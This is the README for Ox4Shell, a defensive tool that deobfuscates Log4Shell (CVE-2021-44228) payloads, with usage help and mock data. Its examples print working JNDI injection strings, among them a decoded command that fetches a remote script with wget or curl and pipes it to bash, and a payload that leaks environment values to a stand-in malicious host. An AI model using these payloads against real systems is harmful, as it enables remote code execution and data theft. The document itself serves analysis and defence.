![Logo-Light](https://gist.githubusercontent.com/oxeye-daniel/269eb41b379cf951d95ee4a23555db74/raw/e9b937b101cfc3b2a7dab83b640189adde1da287/bright.png#gh-dark-mode-only)![Logo-Dark](https://gist.githubusercontent.com/oxeye-daniel/269eb41b379cf951d95ee4a23555db74/raw/e9b937b101cfc3b2a7dab83b640189adde1da287/dark.png#gh-light-mode-only)

<hr/>
<p align="center">
    <img alt="maintained-oxeye" src="https://img.shields.io/badge/maintained%20by-oxeye.io-blueviolet"/>
    <img alt="python-3.8" src="https://img.shields.io/badge/python-3.8-green"/>
    <img alt="version-1.1" src="https://img.shields.io/badge/version-1.1-blue"/>
    <img alt="license-mit" src="https://img.shields.io/badge/license-MIT-lightgrey"/>
    <img alt="blackhat-arsenal" src="https://github.com/toolswatch/badges/blob/master/arsenal/usa/2022.svg"/>
</p>

# Ox4Shell
Deobfuscate Log4Shell payloads with ease.

## Description
Since the release of the Log4Shell vulnerability (CVE-2021-44228), many tools were created to obfuscate Log4Shell payloads,
making the lives of security engineers a nightmare.

This tool intends to unravel the true contents of obfuscated Log4Shell payloads. 

For example, consider the following obfuscated payload:
```text
${zrch-Q(NGyN-yLkV:-}${j${sm:Eq9QDZ8-xEv54:-ndi}${GLX-MZK13n78y:GW2pQ:-:l}${ckX:2@BH[)]Tmw:a(:-da}${W(d:KSR)ky3:bv78UX2R-5MV:-p:/}/1.${)U:W9y=N:-}${i9yX1[:Z[Ve2=IkT=Z-96:-1.1}${[W*W:w@q.tjyo@-vL7thi26dIeB-HxjP:-.1}:38${Mh:n341x.Xl2L-8rHEeTW*=-lTNkvo:-90/}${sx3-9GTRv:-Cal}c$c${HR-ewA.mQ:g6@jJ:-z}3z${uY)u:7S2)P4ihH:M_S8fanL@AeX-PrW:-]}${S5D4[:qXhUBruo-QMr$1Bd-.=BmV:-}${_wjS:BIY0s:-Y_}p${SBKv-d9$5:-}Wx${Im:ajtV:-}AoL${=6wx-_HRvJK:-P}W${cR.1-lt3$R6R]x7-LomGH90)gAZ:NmYJx:-}h}
```

After running Ox4Shell, it would transform into an intuitive and readable form:
```text
${jndi:ldap://1.1.1.1:3890/Calc$cz3z]Y_pWxAoLPWh}
```

This tool also aids to identify and decode base64 commands
For example, consider the following obfuscated payload:
```text
${jndi:ldap://1.1.1.1:1389/Basic/Command/Base64/KHdnZXQgLU8gLSBodHRwOi8vMTg1LjI1MC4xNDguMTU3OjgwMDUvYWNjfHxjdXJsIC1vIC0gaHR0cDovLzE4NS4yNTAuMTQ4LjE1Nzo4MDA1L2FjYyl8L2Jpbi9iYXNoIA==}
```

After running Ox4Shell, the tool reveals the attacker’s intentions:
```text
${jndi:ldap://1.1.1.1:1389/Basic/(wget -O - http://185.250.148.157:8005/acc||curl -o - http://185.250.148.157:8005/acc)|/bin/bash
```

⚠️ We recommend running `Ox4Shell` with a provided file (`-f`) rather than an inline payload (`-p`), because certain 
shell environments will escape important characters, therefore will yield inaccurate results. 

## Usage
To run the tool simply:
```
~/Ox4Shell » python ox4shell.py --help
usage: ox4shell [-h] [-d] [-m MOCK] [--max-depth MAX_DEPTH] [--decode-base64] (-p PAYLOAD | -f FILE)

   ____       _  _   _____ _          _ _ 
  / __ \     | || | / ____| |        | | |
 | |  | |_  _| || || (___ | |__   ___| | |
 | |  | \ \/ /__   _\___ \| '_ \ / _ \ | |
 | |__| |>  <   | | ____) | | | |  __/ | |
  \____//_/\_\  |_||_____/|_| |_|\___|_|_|

Ox4Shell - Deobfuscate Log4Shell payloads with ease.
    Created by https://oxeye.io

General:
  -h, --help            Show this help message and exit
  -d, --debug           Enable debug mode (default: False)
  -m MOCK, --mock MOCK  The location of the mock data JSON file that replaces certain values in the payload (default: mock.json)
  --max-depth MAX_DEPTH
                        The maximum number of iteration to perform on a given payload (default: 150)
  --decode-base64       Payloads containing base64 will be decoded (default: False)

Targets:
  Choose which target payloads to run Ox4Shell on

  -p PAYLOAD, --payload PAYLOAD
                        A single payload to deobfuscate, make sure to escape '$' signs (default: None)
  -f FILE, --file FILE  A file containing payloads delimited by newline (default: None)
```

## Mock Data
The Log4j library has a few unique lookup functions, which allow users to look up environment variables, runtime 
information on the Java process, and so forth. This capability grants threat actors the ability to probe for specific 
information that can uniquely identify the compromised machine they targeted.

Ox4Shell uses the `mock.json` file to insert common values into certain lookup function, for example,
if the payload contains the value `${env:HOME}`, we can replace it with a custom mock value.

The default set of mock data provided is:
```json
{
    "hostname": "ip-127.0.0.1",
    "env": {
        "aws_profile": "staging",
        "user": "ubuntu",
        "pwd": "/opt/",
        "path": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin"
    },
    "sys": {
        "java.version": "16.0.2",
        "user.name": "ubuntu"
    },
    "java": {
        "version": "Java version 16.0.2",
        "runtime": "OpenJDK Runtime Environment (build 1.8.0_181-b13) from Oracle Corporation",
        "vm": "OpenJDK 64-Bit Server VM (build 25.181-b13, mixed mode)",
        "os": "Linux 5.10.47-linuxkit unknown, architecture: amd64-64",
        "locale": "default locale: en_US, platform encoding: UTF-8",
        "hw": "processors: 1, architecture: amd64-64"
    }
}

```

As an example, we can deobfuscate the following payload using the Ox4Shell's mocking capability:
```bash
~/Ox4Shell >> python ox4shell.py -p "\${jndi:ldap://\${sys:java.version}.\${env:AWS_PROFILE}.malicious.server/a}"  
${jndi:ldap://16.0.2.staging.malicious.server/a}
```

## Authors
- [Daniel Abeles](https://twitter.com/Daniel_Abeles)
- [Ron Vider](https://twitter.com/ron_vider)


## License
The source code for the project is licensed under the MIT license, which you can find in the LICENSE file.
